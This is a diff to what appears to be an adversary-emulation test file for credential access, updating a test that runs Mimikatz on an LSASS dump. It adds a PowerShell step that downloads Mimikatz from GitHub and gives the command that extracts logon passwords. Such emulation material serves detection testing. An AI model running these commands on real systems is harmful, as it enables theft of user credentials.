@@ -19624,18 +19624,31 @@ credential-access:
       supported_platforms:
       - windows
       input_arguments:
-        mimikatz_binary_path:
+        mimikatz_exe:
           description: Path of the Mimikatz binary
           type: string
-          default: "$PathToAtomicsFolder\\T1003\\bin\\mimikatz.exe"
+          default: PathToAtomicsFolder\T1003\bin\mimikatz.exe
         input_file:
           description: Path of the Lsass dump
           type: Path
-          default: C:\Windows\Temp\lsass_dump.dmp
+          default: "%tmp%\\lsass.DMP"
+      dependency_executor_name: powershell
+      dependencies:
+      - description: Mimikatz must exist on disk at specified location (#{mimikatz_exe})
+        prereq_command: 'if (Test-Path #{mimikatz_exe}) {exit 0} else {exit 1}'
+        get_prereq_command: |-
+          Invoke-WebRequest "https://github.com/gentilkiwi/mimikatz/releases/download/2.2.0-20200308/mimikatz_trunk.zip" -OutFile "$env:TEMP\Mimi.zip"
+          Expand-Archive $env:TEMP\Mimi.zip $env:TEMP\Mimi -Force
+          New-Item -ItemType Directory (Split-Path #{mimikatz_exe}) -Force | Out-Null
+          Copy-Item $env:TEMP\Mimi\x64\mimikatz.exe #{mimikatz_exe} -Force
+      - description: Lsass dump must exist at specified location (#{input_file})
+        prereq_command: 'cmd /c "if not exist #{input_file} (exit /b 1)"'
+        get_prereq_command: Write-Host "Create the lsass dump manually using the steps
+          in the previous test (Dump LSASS.exe Memory using Windows Task Manager)"
       executor:
         name: command_prompt
         elevation_required: true
-        command: '#{mimikatz_binary_path} "sekurlsa::minidump #{input_file}" "sekurlsa::logonpasswords
+        command: '#{mimikatz_exe} "sekurlsa::minidump #{input_file}" "sekurlsa::logonpasswords
           full" exit
 
 '
